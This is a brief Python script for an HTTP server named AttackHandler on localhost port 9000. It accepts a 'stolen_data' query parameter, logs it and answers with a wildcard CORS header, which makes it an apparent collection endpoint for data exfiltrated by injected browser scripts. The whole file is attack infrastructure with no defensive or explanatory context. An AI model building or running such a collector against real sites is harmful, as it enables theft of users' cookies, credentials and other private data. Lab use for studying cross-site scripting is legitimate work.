from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


class AttackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)
        stolen_info = params.get("stolen_data", ["No Data Received"])[0]
        print(f" Received data: {stolen_info}")
        print("\n" * 10)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"Logged.")


if __name__ == "__main__":
    server = HTTPServer(("localhost", 9000), AttackHandler)
    print("Listening on http://localhost:9000...")
    server.serve_forever()
